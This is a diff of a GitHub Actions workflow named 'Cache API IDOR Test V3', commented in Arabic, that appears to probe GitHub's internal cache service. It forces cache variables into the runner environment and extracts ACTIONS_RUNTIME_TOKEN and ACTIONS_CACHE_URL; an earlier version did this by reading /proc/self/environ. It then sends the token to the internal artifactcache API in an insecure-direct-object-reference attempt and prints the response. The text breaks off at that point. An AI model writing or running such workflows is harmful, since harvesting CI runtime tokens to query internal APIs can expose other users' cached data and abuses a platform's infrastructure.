@@ -1,27 +1,34 @@
-name: Cache API IDOR Test V2
+name: Cache API IDOR Test V3
 on: [push]
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Query Internal Cache API via Memory Extract
+      # 1. خطوة وهمية لإجبار GitHub على حقن متغيرات الكاش في البيئة
+      - name: Trigger Cache Env Vars
+        uses: actions/cache@v3
+        with:
+          path: |
+            ~/.npm
+          key: ${{ runner.os }}-dummy-cache-${{ github.run_id }}
+          restore-keys: |
+            ${{ runner.os }}-dummy-cache-
+      
+      # 2. استخراج التوكن والاستعلام عن الـ API
+      - name: Query Internal Cache API
         run: |
-          # 1. استخراج المتغيرات من ذاكرة العملية (Process Environment)
-          ENV_DATA=$(cat /proc/self/environ | tr '\0' '\n')
-          
-          CACHE_URL=$(echo "$ENV_DATA" | grep ^ACTIONS_CACHE_URL= | cut -d'=' -f2-)
-          RUNTIME_TOKEN=$(echo "$ENV_DATA" | grep ^ACTIONS_RUNTIME_TOKEN= | cut -d'=' -f2-)
+          # قراءة المتغيرات من البيئة (الآن يجب أن تكون موجودة)
+          CACHE_URL="$ACTIONS_CACHE_URL"
+          RUNTIME_TOKEN="$ACTIONS_RUNTIME_TOKEN"
           
           echo "Cache URL found: $([ -n "$CACHE_URL" ] && echo yes || echo no)"
           echo "Token found: $([ -n "$RUNTIME_TOKEN" ] && echo yes || echo no)"
           
-          # 2. إذا تم العثور على المتغيرات، قم بإرسال طلب IDOR
           if [ -n "$CACHE_URL" ] && [ -n "$RUNTIME_TOKEN" ]; then
             # مسار الـ API الخاص بالكاش
             QUERY_URL="${CACHE_URL}_apis/artifactcache/caches"
             
             echo "Sending IDOR request to internal API..."
-            # نستخدم -s للصمت، و --fail لكي لا يتعطل الـ Workflow
             RESPONSE=$(curl -s -H "Authorization: Bearer $RUNTIME_TOKEN" "$QUERY_URL")
             
             echo "API Response:"
